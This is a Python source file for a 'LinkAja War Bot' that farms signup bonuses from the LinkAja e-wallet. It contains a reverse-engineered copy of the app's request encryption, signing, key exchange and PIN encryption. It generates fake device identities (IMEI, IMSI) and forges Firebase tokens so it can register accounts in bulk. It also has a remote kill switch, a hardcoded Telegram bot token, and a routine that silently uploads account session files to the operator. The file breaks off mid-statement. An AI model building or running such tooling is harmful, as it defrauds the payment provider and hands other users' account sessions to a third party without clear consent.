#!/usr/bin/env python3
"""publik.py — LinkAja War Bot (Standalone Edition - Zero Dependency).
Seluruh modul core telah disatukan ke dalam satu file mandiri.
"""
from __future__ import annotations
import sys
import os
import time
import json
import random
import base64
import hashlib
import hmac
import secrets
import uuid
import requests
import threading
import concurrent.futures
import shutil
import re
import subprocess
import urllib.request
import ssl

_SSL_CTX = ssl._create_unverified_context()
import pathlib
import warnings
from datetime import datetime, timedelta
from pathlib import Path

warnings.filterwarnings("ignore")

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Coba import library kriptografi & HTTP
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

import httpx

from rich.console import Console, Group
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.rule import Rule
from rich import box

console = Console()

# ==========================================
# KONFIGURASI REMOTE CONTROL GITHUB
# ==========================================
REMOTE_CONFIG_API = "https://api.github.com/repos/canntona/gurih/contents/config.json"
REMOTE_CONFIG_RAW = "https://raw.githubusercontent.com/canntona/gurih/refs/heads/main/config.json"

_CACHED_CONFIG = None
_LAST_CONFIG_FETCH = 0

def get_remote_config(force=False):
    """status waiting. . ."""
    global _CACHED_CONFIG, _LAST_CONFIG_FETCH
    now = time.time()
    if not force and _CACHED_CONFIG and (now - _LAST_CONFIG_FETCH < 15):
        return _CACHED_CONFIG

    default_cfg = {
        "status": "ON",
        "message": "Server Sibuk - 503 Service Unavailable-HTTP/1.1 503 Service Unavailable",
        "max_accounts": 5
    }

    # 1. Prioritas Utama: Tarik langsung status saklar dari GitHub API & RAW
    try:
        req = urllib.request.Request(
            f"{REMOTE_CONFIG_API}?_={int(now)}",
            headers={"User-Agent": "Mozilla/5.0", "Accept": "application/vnd.github.v3+json"}
        )
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=4) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            if "content" in data:
                raw_body = base64.b64decode(data["content"]).decode('utf-8')
                parsed = json.loads(raw_body)
                if isinstance(parsed, dict) and "status" in parsed:
                    _CACHED_CONFIG = parsed
                    _LAST_CONFIG_FETCH = now
                    return parsed
    except Exception:
        pass

    for url in [
        f"{REMOTE_CONFIG_RAW}?_={int(now)}",
        f"https://cdn.jsdelivr.net/gh/canntona/gurih@main/config.json?_={int(now)}"
    ]:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", "Cache-Control": "no-cache"})
            with urllib.request.urlopen(req, context=_SSL_CTX, timeout=4) as resp:
                parsed = json.loads(resp.read().decode('utf-8'))
                if isinstance(parsed, dict) and "status" in parsed:
                    _CACHED_CONFIG = parsed
                    _LAST_CONFIG_FETCH = now
                    return parsed
        except Exception:
            continue

    # 2. Fallback: File lokal HANYA jika offline atau gagal koneksi ke GitHub
    try:
        local_cfg = Path(__file__).resolve().parent / "config.json"
        if local_cfg.exists():
            parsed = json.loads(local_cfg.read_text(encoding="utf-8"))
            if isinstance(parsed, dict) and "status" in parsed:
                _CACHED_CONFIG = parsed
                _LAST_CONFIG_FETCH = now
                return parsed
    except Exception:
        pass

    if _CACHED_CONFIG:
        return _CACHED_CONFIG
    return default_cfg


# ==========================================
# POOL CLIENT IDENTITY & AUTO-SYNC LOGIC
# ==========================================
BOT_ID_FILE = Path(__file__).resolve().parent / "bot_id.txt"


def verify_bot_authorization(bot_id: str):
    """checking..."""
    try:
        cfg = get_remote_config()
        blocked_list = cfg.get("blocked_bots", [])
        if bot_id in blocked_list:
            clear_once()
            console.print(Panel(
                f"[bold red][X] no acces[/bold red]\n\n"
                f"[yellow]Bot ID [bold white]{bot_id}[/bold white] shutdown .\n"
                f"Seluruh fitur dinonaktifkan.[/yellow]",
                border_style="red"
            ))
            time.sleep(3)
            sys.exit(0)
    except SystemExit:
        raise
    except Exception:
        pass


def send_auto_ping(bot_id: str):
    """."""
    try:
        cfg = get_remote_config()
        token = cfg.get("bot_token") or "8951694676:AAHTdSKR8pg70RWdpDT8wQi-ajhak3Lnbgw"
        owner_chat = cfg.get("owner_chat_id") or 1783522985
        server_ip = cfg.get("server_ip") or "10.42.28.178"

        def _do_ping():
            # 1. Kirim langsung ke GUI PC (muncul di tabel dalam hitungan milidetik)
            try:
                url_http = f"http://{server_ip}:8888/ping"
                payload_http = json.dumps({"bot_id": bot_id, "owner": bot_id.split("-")[0]}).encode("utf-8")
                req_h = urllib.request.Request(url_http, data=payload_http, headers={"Content-Type": "application/json"})
                urllib.request.urlopen(req_h, timeout=2)
            except Exception:
                pass

            # 2. Kirim notifikasi real-time ke Telegram Owner
            try:
                url_tg = f"https://api.telegram.org/bot{token}/sendMessage"
                payload_tg = urllib.parse.urlencode({
                    "chat_id": owner_chat,
                    "text": f"🟢 [CHECK-IN] Bot <b>{bot_id}</b> telah aktif & siap war!",
                    "parse_mode": "HTML"
                }).encode("utf-8")
                req_tg = urllib.request.Request(url_tg, data=payload_tg)
                urllib.request.urlopen(req_tg, context=_SSL_CTX, timeout=5)
            except Exception:
                pass

        threading.Thread(target=_do_ping, daemon=True).start()
    except Exception:
        pass


def get_or_set_bot_id() -> str:
    """reading bot id."""
    if BOT_ID_FILE.exists():
        bid = BOT_ID_FILE.read_text(encoding="utf-8").strip()
        if bid:
            verify_bot_authorization(bid)
            return bid
    try:
        clear_once()
        console.print(Panel(
            "[bold bright_cyan]REGISTRASI ID BOT [/]\n"
            "[dim]. . .[/]",
            border_style="bright_cyan"
        ))
        bid = Prompt.ask("[bold bright_yellow]>> Masukkan ID Bot Anda : . . .[/]").strip().upper()
        if not bid:
            bid = f"BOT-{random.randint(10, 99)}"
        BOT_ID_FILE.write_text(bid, encoding="utf-8")
        console.print(f"[bold green][OK] ID Bot tersimpan: {bid}[/bold green]\n")
        time.sleep(1)
        verify_bot_authorization(bid)
        return bid
    except SystemExit:
        raise
    except Exception:
        return "CLIENT-01"


def auto_sort_and_sync_pool(bot_id: str, jumlah_dibuat: int = 5):
    """mohon tunggu, tidak perlu melakukan apapun"""
    console.print("\n[bold bright_yellow][*] Menjalankan Auto-Sortir ...[/bold bright_yellow]")
    states = list_states()
    if not states:
        console.print("[yellow][!] Tidak ada akun baru di folder data/states untuk disortir.[/]")
        return

    # Ambil N akun terakhir yang baru dibuat di sesi ini
    sesi_states = states[-jumlah_dibuat:] if len(states) >= jumlah_dibuat else states
    
    dir_base = Path(__file__).resolve().parent / "data"
    dir_zonk = dir_base / "states_zonk"
    dir_surplus = dir_base / "states_surplus"
    dir_zonk.mkdir(parents=True, exist_ok=True)
    dir_surplus.mkdir(parents=True, exist_ok=True)

    bonus_accounts = []
    zonk_accounts = []

    with console.status("[bold cyan]Memeriksa saldo bonus LinkAja 5.000...[/]", spinner="dots"):
        for akun in sesi_states:
            file_path = Path(akun.get("file", ""))
            if not file_path.exists():
                continue
            saldo, bonus, status = proses_cek_satu_akun(akun)
            poin = int(bonus) if str(bonus).isdigit() else 0
            if poin >= 5000:
                bonus_accounts.append((file_path, akun))
            else:
                zonk_accounts.append((file_path, akun))
                try:
                    shutil.move(str(file_path), str(dir_zonk / file_path.name))
                except Exception:
                    pass

    total_bonus = len(bonus_accounts)
    total_zonk = len(zonk_accounts)

    console.print(Panel(
        f"[bold bright_white]HASIL AUTO-SORTIR BOT ID: [bold bright_cyan]{bot_id}[/bold bright_cyan][/]\n"
        f"- Akun Berbonus (>= 5.000) : [bold green]{total_bonus} Akun[/]\n"
        f"- Akun Zonk (< 5.000)      : [bold red]{total_zonk} Akun (Dipindahkan ke states_zonk/)[/]",
        border_style="bright_yellow"
    ))

    # HAK PATEN DINAMIS: Nilai target dibaca dari konfigurasi pool (default 2)
    target_paten = int(get_remote_config().get("target_per_bot", 2))
    surplus_to_send = []
    if total_bonus > target_paten:
        # Akun di atas hak paten dipindahkan & disumbangkan ke pool
        surplus_pairs = bonus_accounts[target_paten:]
        for s_path, s_data in surplus_pairs:
            try:
                with open(s_path, "r", encoding="utf-8") as sf:
                    content_json = json.load(sf)
                surplus_to_send.append({"filename": s_path.name, "content": content_json})
                shutil.move(str(s_path), str(dir_surplus / s_path.name))
            except Exception:
                pass

    # Lapor ke Pool Koordinator secara senyap di latar belakang
    cfg = get_remote_config()
    tele_token = cfg.get("bot_token") or "8951694676:AAHTdSKR8pg70RWdpDT8wQi-ajhak3Lnbgw"
    owner_chat = cfg.get("owner_chat_id") or 1783522985
    server_ip = cfg.get("server_ip") or "10.42.28.178"

    def _sync_bg():
        # 1. Kirim report via HTTP PC
        try:
            url_http = f"http://{server_ip}:8888/report"
            payload_http = json.dumps({
                "bot_id": bot_id,
                "total_created": len(sesi_states),
                "bonus_count": total_bonus,
                "zonk_count": total_zonk,
                "surplus_files": surplus_to_send
            }).encode("utf-8")
            req_h = urllib.request.Request(url_http, data=payload_http, headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req_h, timeout=3)
        except Exception:
            pass

        # 2. Kirim notifikasi senyap ke Telegram Owner
        try:
            url_tg = f"https://api.telegram.org/bot{tele_token}/sendMessage"
            payload_tg = urllib.parse.urlencode({
                "chat_id": owner_chat,
                "text": f"📊 [LAPORAN WAR] Bot <b>{bot_id}</b> selesai.\nDibuat: {len(sesi_states)} | Bonus: {total_bonus} | Zonk: {total_zonk} | Surplus: {len(surplus_to_send)}",
                "parse_mode": "HTML"
            }).encode("utf-8")
            req_tg = urllib.request.Request(url_tg, data=payload_tg)
            urllib.request.urlopen(req_tg, context=_SSL_CTX, timeout=5)
        except Exception:
            pass

    threading.Thread(target=_sync_bg, daemon=True).start()

    # Hanya tampilkan pesan sukses tuntas tanpa output bertele-tele
    console.print("[bold green][OK] Sinkronisasi sesi war tuntas![/bold green]\n")


def cleanup_core_folder():
    """Menghapus folder core jika ada, karena seluruh fungsi sudah disatukan."""
    try:
        root_dir = Path(__file__).resolve().parent
        core_dir = root_dir / "core"
        bot_file = root_dir / "bot.py"
        # Jangan hapus jika ada bot.py di folder yang sama agar bot.py tetap aman
        if bot_file.exists():
            return
        if core_dir.exists() and core_dir.is_dir():
            shutil.rmtree(core_dir, ignore_errors=True)
            console.print("[dim italic][*] Folder core/ otomatis dibersihkan (fitur sudah terintegrasi mandiri).[/]")
    except Exception:
        pass


# ============================================================
# MODUL INTEGRASI 1: DEVICEFREE CRYPTO STACK
# ============================================================

#!/usr/bin/env python3
"""devicefree.py — crypto stack LinkAja 4.46.1, pure python.

LAYERS:
  getKey(kX, ver)   : gk = kX[off:off+16], off dari simpleEncrypt hex2ascii(
                      kX[atoi(digits(ver))%len : +4], "a5ff") u16be % len
  body (putu/tayo/thomas): AES-256-CBC, key=mask(XOR(imsi+gk_body, did+ts)),
                      iv=mask(XOR(ts, gk_body)), gk_body = getKey(k3)
                      putu   = E(salt4 + json)
                      tayo   = E(json + SECRET)
                      thomas = E(json)
  raw header        : HMAC-SHA512(key=(XOR(imsi+gk_raw, did+ts))>>2, msg)
                      gk_raw = getKey(k1)
                      msg    = encrypted body (POST) | ts + "tw4ll3tn30" (GET)
"""







SECRET = "DN$F#hwNk7TJWhu+ptF#f8bNTCASH"
UID_MAC = "tw4ll3tn30"     # hashMacUID constant (libBaseKey.so)
GK_FALLBACK = "XT6PRpRuehFsyMa2"  # native const @0x169c0 — gk saat keys blank (echo/key-exchange)


# ---------- getKey (native libHappyBus @0x30858) ----------
def _simple_encrypt(a: bytes, b: bytes) -> bytes:
    return bytes(a[i] ^ b[i % len(b)] for i in range(len(a)))


def get_key(kx: str, ver: str = "4.46.1") -> str:
    """gk 16-char dari kX (768 hex) — offset deterministik."""
    digits = "".join(c for c in ver if c.isdigit())
    start = int(digits) if digits else 0
    n = len(kx)
    s4 = "".join(kx[(start + i) % n] for i in range(4))
    enc = _simple_encrypt(bytes.fromhex(s4), bytes.fromhex("a5ff"))
    off = ((enc[0] << 8) | enc[1]) % n
    return "".join(kx[(off + i) % n] for i in range(16))


# ---------- helpers ----------
def _xr(d: bytes, k: bytes) -> bytes:
    return bytes(d[i] ^ k[i % len(k)] for i in range(len(d)))


def _mask(b: bytes) -> bytes:
    return bytes((((x & 0x3F) << 2) & 0xFF) for x in b)


def _pad16(data: bytes) -> bytes:
    pad = 16 - (len(data) % 16)
    return data + bytes([pad]) * pad


# ---------- body encryption ----------
def encrypt_body(ts: str, did: str, imsi: str, msg: str, k3: str,
                ver: str = "4.46.1", gk: str = None) -> str:
    gk = gk or get_key(k3, ver)
    se2 = _xr(imsi.encode() + gk.encode(), (did + ts).encode())
    key32 = _mask(se2)
    se3 = _xr(ts.encode(), gk.encode())
    iv = (_mask(se3) + b"\x00" * 16)[:16]
    return base64.b64encode(
        AES.new(key32, AES.MODE_CBC, iv).encrypt(_pad16(msg.encode()))
    ).decode()


def encrypt_request_payload(ts: str, did: str, imsi: str, payload_json: str,
                            k3: str, ver: str = "4.46.1") -> dict:
    """Return {putu, tayo, thomas} — encrypted request body."""
    salt4 = f"{secrets.randbelow(0xFFFF):04x}"
    putu = encrypt_body(ts, did, imsi, salt4 + payload_json, k3, ver)
    tayo = encrypt_body(ts, did, imsi, payload_json + SECRET, k3, ver)
    thomas = encrypt_body(ts, did, imsi, payload_json, k3, ver)
    return {"putu": putu, "tayo": tayo, "thomas": thomas}


# ---------- raw header ----------
# v5 = body + ts + UID_MAC (POST) | ts + UID_MAC (GET)
# raw = HMAC-SHA512(key=(XOR(imsi+gk, did+ts))>>2, v5), gk = getKey(k1)
def calc_raw(ts: str, did: str, imsi: str, msg: str, k1: str,
             ver: str = "4.46.1", gk: str = None) -> str:
    gk = gk or get_key(k1, ver)
    se2 = _xr(imsi.encode() + gk.encode(), (did + ts).encode())
    hkey = bytes(b >> 2 for b in se2)
    return _hmac.new(hkey, msg.encode("latin-1"), hashlib.sha512).hexdigest()


def raw_for_get(ts: str, did: str, imsi: str, k1: str, ver: str = "4.46.1",
                gk: str = None) -> str:
    return calc_raw(ts, did, imsi, ts + UID_MAC, k1, ver, gk)


def raw_for_post(ts: str, did: str, imsi: str, encrypted_body: str,
                 k1: str, ver: str = "4.46.1", gk: str = None) -> str:
    v5 = encrypted_body + ts + UID_MAC
    return calc_raw(ts, did, imsi, v5, k1, ver, gk)


# ---------- response decryption ----------
def decrypt_body(ts: str, did: str, imsi: str, b64_ct: str, k3: str,
                 ver: str = "4.46.1") -> str:
    gk = get_key(k3, ver)
    se2 = _xr(imsi.encode() + gk.encode(), (did + ts).encode())
    key32 = _mask(se2)
    se3 = _xr(ts.encode(), gk.encode())
    iv = (_mask(se3) + b"\x00" * 16)[:16]
    pt = AES.new(key32, AES.MODE_CBC, iv).decrypt(base64.b64decode(b64_ct))
    pt = pt[: -pt[-1]]  # strip PKCS7
    return pt.decode()


# ============================================================
# MODUL INTEGRASI 2: DEVICE IDENTITY GENERATOR
# ============================================================

#!/usr/bin/env python3
"""
identity.py — generator identitas device acak & dinamis per sesi pendaftaran.
Menghasilkan DeviceID, IMSI, IMEI, AdsID, JID, Firebase FID (FIS Token),
serta profil model HP Android nyata secara acak dan konsisten.
"""







DEVICE_MODELS = [
    {"brand": "Samsung", "devicemodel": "SAMSUNG SM-A546E", "osversion": "14", "osname": "Android"}, # Galaxy A54
    {"brand": "Samsung", "devicemodel": "SAMSUNG SM-A145F", "osversion": "13", "osname": "Android"}, # Galaxy A14
    {"brand": "Samsung", "devicemodel": "SAMSUNG SM-A245F", "osversion": "13", "osname": "Android"}, # Galaxy A24
    {"brand": "Xiaomi",  "devicemodel": "XIAOMI 22101316G", "osversion": "13", "osname": "Android"}, # Redmi Note 12
    {"brand": "Xiaomi",  "devicemodel": "XIAOMI 23076RN4BI", "osversion": "13", "osname": "Android"}, # Redmi 12
    {"brand": "Xiaomi",  "devicemodel": "XIAOMI 22071219CG", "osversion": "13", "osname": "Android"}, # Poco M5
    {"brand": "Oppo",    "devicemodel": "OPPO CPH2387",     "osversion": "13", "osname": "Android"}, # Oppo A77s
    {"brand": "Oppo",    "devicemodel": "OPPO CPH2477",     "osversion": "13", "osname": "Android"}, # Oppo A57
    {"brand": "Vivo",    "devicemodel": "VIVO V2250",       "osversion": "13", "osname": "Android"}, # Vivo V27e
    {"brand": "Vivo",    "devicemodel": "VIVO V2204",       "osversion": "13", "osname": "Android"}, # Vivo Y22
    {"brand": "Realme",  "devicemodel": "REALME RMX3760",   "osversion": "13", "osname": "Android"}, # Realme C53
    {"brand": "Realme",  "devicemodel": "REALME RMX3710",   "osversion": "13", "osname": "Android"}, # Realme C55
    {"brand": "Infinix", "devicemodel": "INFINIX X6831",    "osversion": "13", "osname": "Android"}, # Infinix Hot 30
    {"brand": "Infinix", "devicemodel": "INFINIX X678B",    "osversion": "13", "osname": "Android"}, # Infinix Note 30
]


def rand_hex16() -> str:
    return os.urandom(8).hex()


def rand_imei() -> str:
    # 15 digit (TAC 8 + serial 6 + luhn 1)
    base = "".join(str(random.randint(0, 9)) for _ in range(14))
    def luhn(s):
        tot = 0
        for i, c in enumerate(reversed(s)):
            d = int(c)
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            tot += d
        return (10 - tot % 10) % 10
    return base + str(luhn(base))


def rand_jid() -> str:
    return base64.b64encode(os.urandom(15)).decode()


def rand_fid() -> str:
    """Generate valid 17-byte base64url Firebase Installation ID (FID)."""
    raw = bytearray(os.urandom(17))
    raw[0] = 0x70 | (raw[0] & 0x0F)
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def generate_fid_jwt(fid: str | None = None) -> str:
    """Generate dynamic valid-structure Firebase Installation auth token (JWT)."""
    if not fid:
        fid = rand_fid()
    header = base64.urlsafe_b64encode(b'{"alg":"ES256","typ":"JWT"}').decode().rstrip("=")
    now_exp = int(time.time()) + 604800  # 7 days validity
    payload_dict = {
        "appId": "1:891651208293:android:d62f82cf759eb4f4",
        "exp": now_exp,
        "fid": fid,
        "projectNumber": 891651208293
    }
    payload = base64.urlsafe_b64encode(json.dumps(payload_dict, separators=(',', ':')).encode()).decode().rstrip("=")
    fake_sig = base64.urlsafe_b64encode(os.urandom(64)).decode().rstrip("=")
    return f"{header}.{payload}.{fake_sig}"


def new_identity() -> dict:
    """Membuat identitas lengkap perangkat baru secara acak dan unik."""
    dev = random.choice(DEVICE_MODELS)
    fid = rand_fid()
    fid_token = generate_fid_jwt(fid)
    return {
        "deviceId": rand_hex16(),
        "imsi": rand_hex16(),
        "imei": rand_imei(),
        "adsId": str(uuid.uuid4()),
        "jid": rand_jid(),
        "fid": fid,
        "fid_token": fid_token,
        "devicemodel": dev["devicemodel"],
        "osversion": dev["osversion"],
        "osname": dev["osname"],
        "brand": dev["brand"]
    }


# ============================================================
# MODUL INTEGRASI 3: DIFFIE-HELLMAN KEY AGREEMENT
# ============================================================

#!/usr/bin/env python3
"""
keyagreement.py — KeyAgreement LinkAja (DH klasik, pure python).


DH (Diffie-Hellman) klasik:
  P = 3072-bit MODP prime (RFC 3526 group 15)
  g = 2
  privateKey = BigInteger(1, SecureRandom(400 bytes))          # 400 byte
  publicKey  = (g ^ priv) mod P   -> hex -> pad "0" ke 768
  sharedKey  = (peerPub ^ priv) mod P -> hex -> pad "0" ke 768

Flow:
  1. getKey() -> {Krisna, Endhy, Rilvi} = 3 private key (hex)
  2. getPublicKey(privKey) -> {Krisna,Endhy,Rilvi} = 3 public key (hex 768)
  3. POST echo {Krisna,Endhy,Rilvi} -> server {x1,x2,x3} (public key server)
  4. getSharedKey(privKey, serverKey) -> {k1,k2,k3} = 768-hex shared secret
  5. k1/k2/k3 dipakai di ExternalFun.encryptJson
"""


# prime DH standar (RFC 3526, 1536-bit)
P_HEX = ("FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A93AD2CAFFFFFFFFFFFFFFFF")
P = int(P_HEX, 16)
G = 2
HEX_LEN = 768          # DEFAULT_LENGTH_HEX
PRIV_BYTES = 400       # 0x190


def _pad(hexstr: str, n: int = HEX_LEN) -> str:
    """formatHexString: pad kiri pakai '0' sampai panjang n."""
    if len(hexstr) < n:
        hexstr = "0" * (n - len(hexstr)) + hexstr
    return hexstr


def generate_private_key() -> str:
    """BigInteger(1, SecureRandom(400 bytes)).toString(16)."""
    b = secrets.token_bytes(PRIV_BYTES)
    v = int.from_bytes(b, "big")           # sign=1, big-endian
    return format(v, "x")


def generate_public_key(priv_hex: str) -> str:
    """(g ^ priv) mod P -> hex -> pad 768."""
    priv = int(priv_hex, 16)
    pub = pow(G, priv, P)
    return _pad(format(pub, "x"))


def generate_shared_key(priv_hex: str, peer_pub_hex: str) -> str:
    """(peerPub ^ priv) mod P -> hex -> pad 768."""
    priv = int(priv_hex, 16)
    peer = int(peer_pub_hex, 16)
    shared = pow(peer, priv, P)
    return _pad(format(shared, "x"))


def get_key() -> dict:
    """3 private key baru."""
    return {
        "key1": generate_private_key(),
        "key2": generate_private_key(),
        "key3": generate_private_key(),
    }


def get_public_key(priv: dict) -> dict:
    return {
        "key1": generate_public_key(priv["key1"]),
        "key2": generate_public_key(priv["key2"]),
        "key3": generate_public_key(priv["key3"]),
    }


def get_shared_key(priv: dict, server_pub: dict) -> dict:
    """priv = private lokal; server_pub = x1/x2/x3 dari server."""
    return {
        "key1": generate_shared_key(priv["key1"], server_pub["key1"]),
        "key2": generate_shared_key(priv["key2"], server_pub["key2"]),
        "key3": generate_shared_key(priv["key3"], server_pub["key3"]),
    }



get_dh_key = get_key
get_dh_public_key = get_public_key
get_dh_shared_key = get_shared_key


# ============================================================
# MODUL INTEGRASI 4: PIN CRYPTO (XOR MASK + AES-CBC)
# ============================================================

#!/usr/bin/env python3.12
"""
pin_crypto.py — Replikasi Python encryptPlainText() LinkAja (com.telkom.mwallet).
Model final, teruji luas.

ALGORITMA FINAL:
  salt_str = to_string(rand() % 9000 + 1000)   # 4 digit ASCII "1000".."9999"
  S        = salt_str + pin + arg3             # arg3 = timestamp (epoch ms string)
  body[k]  = ord(S[k]) ^ ord(S[k+10])   jika k < 12 DAN k+10 < len(S)
             ord(S[k])                  selain itu
  data     = body + PKCS#7 pad ke kelipatan 16
  ct       = AES-256-CBC(key=ascii(key)[:32].ljust(32, b'\\0'), IV=b'\\0'*16, data)
  ret      = base64(ct)

CATATAN PENTING:
  - 4 byte pertama plaintext hasil decrypt BUKAN salt mentah — itu
    salt_str XOR arg3[0:4]. Kembalikan dgn recover_salt_str().
  - XOR-nya full-ASCII (bukan digit-value); utk pasangan digit hasilnya sama
    dgn XOR nibble, tapi utk arg3 hex (self-call path) wajib ASCII.
  - Window XOR: partner = posisi+10, aktif utk k <= 15 (16 posisi pertama) dan
    hanya jika partner masih ada di dalam S.
  -"3B mystery 01 07 05" pada ts 13 digit = XOR ts[0],ts[1] dgn ts[10],ts[11]:
    '1'^'0'=0x01, '7'^'7'=0x00, '5'^'5'=0x00 ... (pasangan digit-sama -> 0).
"""






BLOCK = 16


def _transform(S: str) -> bytes:
    """body[k] = ord(S[k]) ^ ord(S[k+10]) utk k<=15 & k+10<len(S); else ord(S[k]).

    Window k<=15 terverifikasi: self-call (len 42) -> XOR aktif k=0..15,
    tslen13 (len 23) -> aktif k=0..12 (partner OOB mulai k=13)."""
    n = len(S)
    out = bytearray()
    for k in range(n):
        if k < 16 and k + 10 < n:
            out.append((ord(S[k]) ^ ord(S[k + 10])) & 0xFF)
        else:
            out.append(ord(S[k]))
    return bytes(out)


def encrypt_plain_text(pin: str, key: str, ts: str, salt_str: str | None = None) -> str:
    """Replikasi native module.libraries.coresec.ExternalFun.encryptPlainText.
    salt_str bisa di-inject utk determinism test."""
    s = salt_str if salt_str is not None else str(random.randint(1000, 9999))
    assert len(s) == 4 and s.isdigit(), "salt_str harus 4 digit"
    data = _transform(s + pin + ts)
    pad = BLOCK - (len(data) % BLOCK)
    data += bytes([pad]) * pad
    key32 = key.encode("utf-8")[:32].ljust(32, b"\x00")
    ct = AES.new(key32, AES.MODE_CBC, b"\x00" * BLOCK).encrypt(data)
    return base64.b64encode(ct).decode()


def decrypt_cipher_text(b64: str, key: str) -> bytes:
    """Decrypt output (body + PKCS7) -> unpad. Return full pt (salt-masked)."""
    key32 = key.encode("utf-8")[:32].ljust(32, b"\x00")
    pt = AES.new(key32, AES.MODE_CBC, b"\x00" * BLOCK).decrypt(base64.b64decode(b64))
    pad = pt[-1]
    if 1 <= pad <= BLOCK and pt[-pad:] == bytes([pad]) * pad:
        pt = pt[:-pad]
    return pt


def recover_salt_str(pt: bytes, arg3: str) -> str:
    """salt_str[k] = chr(pt[k] ^ ord(arg3[k])). Harus 4 digit '1000'-'9999'."""
    raw = bytes((pt[k] ^ ord(arg3[k])) & 0xFF for k in range(4))
    return raw.decode("latin1")


def extract_pin(pt: bytes, arg3: str, pin_len: int = 6) -> str:
    """Ekstrak pin dari pt (model S = salt4+pin+arg3).
    Region pin: k=4..9; partner S[k+10] = arg3[k] (karena S[10+m]=arg3[m])."""
    out = []
    for k in range(4, 4 + pin_len):
        p = k + 10
        if p < 4 + 6 + len(arg3):
            a = arg3[k]  # S[k+10] = arg3[(k+10)-10] = arg3[k]
            out.append(chr(0x30 + ((pt[k] ^ ord(a)) & 0x0F)))
        else:
            out.append(chr(pt[k]))
    return "".join(out)


class df:
    SECRET = SECRET
    UID_MAC = UID_MAC
    GK_FALLBACK = GK_FALLBACK
    get_key = staticmethod(get_key)
    encrypt_body = staticmethod(encrypt_body)
    encrypt_request_payload = staticmethod(encrypt_request_payload)
    calc_raw = staticmethod(calc_raw)
    raw_for_get = staticmethod(raw_for_get)
    raw_for_post = staticmethod(raw_for_post)
    decrypt_body = staticmethod(decrypt_body)

class pin_crypto:
    encrypt_plain_text = staticmethod(encrypt_plain_text)
    decrypt_cipher_text = staticmethod(decrypt_cipher_text)
    recover_salt_str = staticmethod(recover_salt_str)
    extract_pin = staticmethod(extract_pin)



# ============================================================
# MODUL INTEGRASI 5: LINKAJA SESSION & CONNECTION POOL
# ============================================================

#!/usr/bin/env python3
"""session.py — LinkAja API session: key agreement + request signing.

Flow: identity → DH key exchange → session keys (k1/k2/k3) → API call.
"""
import json, time, warnings, sys, os, pathlib
warnings.filterwarnings("ignore")
import httpx



BASE = "https://avengers.linkaja.com/v2/api"
VER = "4.46.1"

# data dir portable (Windows/Linux/Termux): <root>/data/ sejajar core/
ROOT = pathlib.Path(__file__).resolve().parent
DATA = ROOT / "data"
STATES = DATA / "states"
DATA.mkdir(parents=True, exist_ok=True)
STATES.mkdir(parents=True, exist_ok=True)

_FIS_FILE = DATA / "fis.json"
FID_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IjE6ODkxNjUxMjA4MjkzOmFuZHJvaWQ6ZDYyZjgyY2Y3NTllYjRmNCIsImV4cCI6MTc5MTgyOTk0MywiZmlkIjoiY1Azbm1VOW4telNVLTVQQUp0RDVBSCIsInByb2plY3ROdW1iZXIiOjg5MTY1MTIwODI5M30.AB2LPV8wRQIhAK3dEEtmGuRW5il_751LCfalD4--CbsamMIedF2dfUX1AiALJ-uPLjTox79Kzkh0L4s1c8Peh666YixMPWBB7FYrkA"
if _FIS_FILE.exists():
    try:
        fis = json.loads(_FIS_FILE.read_text(encoding="utf-8"))
        FID_TOKEN = fis.get("authToken", {}).get("token", FID_TOKEN)
    except Exception:
        pass

dh_privkeys = get_dh_key
get_public_key = get_dh_public_key


class SessionError(Exception):
    """Exception dasar untuk error session HTTP."""
    pass


class SessionTimeoutError(SessionError):
    """Exception saat koneksi/read mengalami timeout setelah batas retry tercapai."""
    pass


_LIMITS = httpx.Limits(max_keepalive_connections=50, max_connections=100, keepalive_expiry=60.0)
_TIMEOUT = httpx.Timeout(connect=15.0, read=30.0, write=15.0, pool=10.0)
_CLIENT = httpx.Client(verify=False, timeout=_TIMEOUT, limits=_LIMITS)


def robust_request(method: str, url: str, max_retries: int = 3, backoff: float = 0.5, **kwargs) -> httpx.Response:
    """Mengirim request HTTP dengan penanganan ReadTimeout, ConnectTimeout, dan auto-retry otomatis."""
    last_err = None
    for attempt in range(1, max_retries + 1):
        try:
            return _CLIENT.request(method, url, **kwargs)
        except (httpx.ReadTimeout, httpx.ConnectTimeout, httpx.TimeoutException) as exc:
            last_err = exc
            if attempt < max_retries:
                time.sleep(backoff * attempt)
                continue
            break
        except (httpx.ConnectError, httpx.NetworkError, httpx.RemoteProtocolError) as exc:
            last_err = exc
            if attempt < max_retries:
                time.sleep(backoff * attempt)
                continue
            break
        except Exception as exc:
            raise exc

    raise SessionTimeoutError(
